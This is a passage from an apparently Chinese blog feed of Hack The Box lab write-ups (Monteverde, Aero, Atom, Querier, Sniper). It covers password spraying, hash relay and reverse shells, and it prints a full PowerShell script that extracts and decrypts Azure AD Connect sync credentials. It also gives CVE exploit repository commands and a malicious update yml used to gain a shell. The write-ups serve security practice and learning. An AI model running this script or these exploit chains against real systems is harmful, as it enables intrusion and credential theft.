&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4426b40786740c7305d93ea06e382c93image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0370475fd82030fafde08a613842492dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE232cda4a25eed1d4e8da0fa0dc53bfb1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的端口：445、389、5985&lt;/p&gt;
&lt;p&gt;445没有：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7afb4bd7f5c08207390677f10b9e8063image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;389可以列出用户名：&lt;/p&gt;
&lt;p&gt;但是AS-REP Roasting失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf114d779bca9d8081ca239ac0ad179c9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那就只能破解试试了：&lt;/p&gt;
&lt;p&gt;发现没有锁定策略：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE49b27ff43cafb6269200e46970c1cdfeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;经过尝试：&lt;/p&gt;
&lt;p&gt;账户名即使密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE105e0d41c91897f7ce7d0554fd87e44aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe709208fcb6e72c01b8a4d7635afbb5eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现内容：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdc8de8f23b84b70e406352ad856bbb41image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;密码喷洒：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7f024ac9675ca06bcd8eba13e1a56e8eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;拿到flag:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9ee4435ce06c2160a6922134155a562eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;bloodhound&lt;/p&gt;
&lt;p&gt;简单解读一下，就是本地提权，或者寻找其他路径：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe4cf0162cd4e7cf6da9b86703cce2961image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winpeass:&lt;/p&gt;
&lt;p&gt;感觉这个有机会，应为和这个组的权限好像有关系：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE65d209b7e589d06fcd76176d689c1a16image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看一下软件安装情况，可以发现这些软件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe30dd0a310c0f7457d77fbae05e3a93dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面的内容属实不会了，无奈看了wp:&lt;/p&gt;
&lt;p&gt;最后修改的poc:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Function Get-ADConnectPassword{
Write-Host &amp;#34;AD Connect Sync Credential Extract POC (@_xpn_)`n&amp;#34;
$key_id = 1
$instance_id = [GUID]&amp;#34;1852B527-DD4F-4ECF-B541-EFCCBFF29E31&amp;#34;
$entropy = [GUID]&amp;#34;194EC2FC-F186-46CF-B44D-071EB61F49CD&amp;#34;
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &amp;#34;Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true&amp;#34;
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = &amp;#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &amp;#39;AD&amp;#39;&amp;#34;
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
add-type -path &amp;#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&amp;#39;
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath &amp;#34;//parameter[@name=&amp;#39;forest-login-domain&amp;#39;]&amp;#34; | select @{Name = &amp;#39;Domain&amp;#39;; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath &amp;#34;//parameter[@name=&amp;#39;forest-login-user&amp;#39;]&amp;#34; | select @{Name = &amp;#39;Username&amp;#39;; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath &amp;#34;//attribute&amp;#34; | select @{Name =&amp;#39;Password&amp;#39;; Expression = {$_.node.InnerXML}}
Write-Host (&amp;#34;Domain: &amp;#34; + $domain.Domain)
Write-Host (&amp;#34;Username: &amp;#34; + $username.Username)
Write-Host (&amp;#34;Password: &amp;#34; + $password.Password)
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb5d2e0593c0820d808addcfcde8e712cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X032 Aero</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x032-aero/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x032-aero/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3750b7f1fc2738082cd7871831d3edafimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe0654ee3d610ebcd14d3a5ba9650ae07image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb6abefba514da9dd59d306ff8a843ea3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;单从靶机的端口开放情况来看，只有80端口开放，web渗透获取立足点，或者有knockd？但是这不是linux，暂且看看吧，没有什么头绪，不是现场的框架，也没有其他端口开放，同时没有其他目录和域名，后面看了一下WP。&lt;/p&gt;
&lt;p&gt;windows 主题 themes&lt;/p&gt;
&lt;p&gt;是有个win11的主题漏洞，研究一下怎么打吧：&lt;/p&gt;
&lt;p&gt;git clone &lt;a href=&#34;https://github.com/Jnnshschl/CVE-2023-38146.git&#34;&gt;https://github.com/Jnnshschl/CVE-2023-38146.git&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE773a351fb7a3fcdd79d4258fc2f1cbf6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;python3 -m pip install -r requirements.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa8ce4703d341cf4a2f7355c08ecd11beimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;sudo apt-get install g++-mingw-w64-x86-64&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8288500b6dee031de9e04ba372635e58image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;运行：&lt;/p&gt;
&lt;p&gt;这里的IP和端口都是本地IP端口：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE789bb20b3b5d29bddb3ead726e61bd48image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;开启监听：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd7cd34b427d7310495d28128b404d9efimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上传：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE19a69ea993df83c9cc54837c7de94b52image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可能要多尝试几次：&lt;/p&gt;
&lt;p&gt;后台应该是个计划任务，对于这些非服务端的攻击，其实真的很难有现成的复现资料：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd6acd0c9b9b41a2e0eb889042889301aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE07735a3a4c81bcac2a8ec7b984f40cd0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那个ps1脚本看起来就是触发脚本，然后那个pdf的内容是再提示漏洞：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb172412664b5050414524af622297decimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;去github找现成的：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/duck-sec/CVE-2023-28252-Compiled-exe&#34;&gt;https://github.com/duck-sec/CVE-2023-28252-Compiled-exe&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc39591775bad6a6622f9ab5b84a67f52image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用msf生成一个木马，然后nc监听即可：&lt;/p&gt;
&lt;p&gt;.\exploit.exe 1208 1 cxk.exe，比较简单&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbf99bb16e37461ce4aa58db5e114830aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X033 Atom</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x033-atom/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x033-atom/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8b12b40668a685aaf03708f82a1327faimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE838d3d2c7c7be70a575948e081b49644image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf47224e81e57676fb1dc66b138668843image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;从端口开放情况来看，值得关注的点有：smb、redis、5985、80、443&lt;/p&gt;
&lt;p&gt;先看smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf0126d08eed606a7b2849f6baa4b2eb1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里的内容，似乎在说，把程序放在这个目录，会自动运行：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE83261bfc23c13a3b3e76b0efea015b67image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;创建者Pages&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa81fdd7469055ca0d7cfaa9467a380b7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看看redis呢：&lt;/p&gt;
&lt;p&gt;好像不行，没有未授权：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8fc7da8c0119ea9131f9d3f0407ce0cfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;web方面，443和80页面一样：&lt;/p&gt;
&lt;p&gt;发现文件，下载：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4dda52a834bc2cb9dab0160b6a02b2b1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;smb确实有写入权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7924124077b02f05625e98a0b4b4984bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;程序看起来没有什么特别的，逆向看看把：&lt;/p&gt;
&lt;p&gt;好像没逆向出来，有点尴尬：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE489df158a57e08c89bb85f55c6b06d6bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;抓包看看了：&lt;/p&gt;
&lt;p&gt;发现dns查询，添加hosts抓取tun0：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE06ea8bc4271baa0819b7b662b66ad474image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后大概了解一下，程序通过访问目标上的yml文件，然后根据yml文件的内容，来尝试更新软件，然后结合刚刚PDF的内容，我们可以上传一个yml文件，指向我们的exe程序，就可以尝试getshell了：&lt;/p&gt;
&lt;p&gt;计算一下值：&lt;/p&gt;
&lt;p&gt;sha512sum &amp;ldquo;8&#39;889.exe&amp;rdquo; | cut -d &amp;rsquo; &amp;rsquo; -f1 | xxd -r -p | base64 -w0&lt;/p&gt;
&lt;p&gt;jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc521913fef8b1266a49fa85f4714dfd3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;yml文件内容如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;version: 1.0.1
files:
 - url: 8&amp;#39;889.exe
   sha512: jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==
   size: 73802
path: 8&amp;#39;889.exe
sha512: jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传上去：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X034 Querier</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x034-querier/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x034-querier/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc2717bb159fbd9f01be8956292b90b01image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf5892ddf82aac0abf2a1a26cb399cf97image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6f9de32208211aadbf0563a45c011cfbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的端口：445、1433、5985&lt;/p&gt;
&lt;p&gt;445：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa4313eb9098171061865f00046ed4d3cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名：Luis&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE79b050ac91ab01092e5a2f356f179652image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不知道为啥，打开是空的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6972a42e706e1d8e28bfbc761afa1715image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是在windows中打开，发现好像是存在宏：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE20058768812ccb032c9d77dc357dceabimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用unzip工具进行提取即可，在提取出来的文件中，可以发现：&lt;/p&gt;
&lt;p&gt;reporting&lt;/p&gt;
&lt;p&gt;PcwTWTHRwryjc$c6&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEacfdd31640226a545cdc7aac5ec6adbfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2645d847fb0ba9683418e008d9f8a268image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;xp_cmd无法开启，试着中继了hash:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe4c3fa49ff4d10b6a0229088f2fb9326image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解成功：&lt;/p&gt;
&lt;p&gt;corporate568     (mssql-svc)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd95c95fba89cec4719cb6873eb751b7bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是登录失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6c179ac5ea28ad2a0a9fe13a61ed64d7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;试试psexec，也失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2a4c206b15df931e7c084fc0208ca632image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用新的账户登录MSSQL：&lt;/p&gt;
&lt;p&gt;xp_cmd开启成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb59b637dc5aaada4c8e8111d337c35c3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过smb共享，反弹shell回来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5a42c25c9604d7fc6daef3e974af42fbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;winpe,&lt;/p&gt;
&lt;p&gt;看起来是打了补丁的，但还是看一下有没有比较好提权的把：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6980fc50ca65e6e95890cb5887e988c7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好像没有，看看其他的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2beb04540ad6d45b006dac833e985fecimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;简单查了一下，好像是可以提权的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe8293bbd2cc028f37bc552d77eade6d6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;接着看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd0eb0cfe25d2a337ca4cafc19b1e53ccimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE73a46b63097aabd443f5dfa829704e42image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;psexec，成功了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa6258c6dd99b0c4f2c0b9ffed6ebeb76image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X035 Sniper</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x035-sniper/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x035-sniper/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE20b61384be2dcd3300751271b979708fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE94818edea997aaa6c02110672ea8a3e7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE32f6533e95fc2a071e14a07191136763image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注端口：80、445：&lt;/p&gt;
&lt;p&gt;445：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE561c3c4f7e0f862188ee76a9da3fa392image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3e935eb2a42bcede5cdca66ad468fb72image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0854af8da2254fde4e8682825de83667image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现文件包含：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb4e4391a1d22e7fc62bec8c352c7efe8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;经过测试远程文件包含不存在，那么该如何getshell呢？&lt;/p&gt;
&lt;p&gt;读取session文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE715f79d4a6643651f118b5bb71966cb8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现里面有我们的名字，于是，我们可以在这里面写入webshell，反弹shell:&lt;/p&gt;
&lt;p&gt;大概就是传入nc，然后反弹：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEea4b53a25034134e89de1cd3c119e533image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;数据库账号密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5e49f988b69e8b1621324f9b2e7114ebimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个密码是Chris用户的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEca5132517c6753321883ec10b92a0450image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用powershell弹个Chris的shell回来：&lt;/p&gt;
&lt;p&gt;直接调用temp里面的失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE61c9060dafa18695af5b56a0b89e8839image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;得重新下一个到Chris的目录里面：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE99c632406bcb6160a0721975c2ae5c93image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;常规提权思路无果，需要信息收集：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE03f9e29a5be930b0cb46796178fa777cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
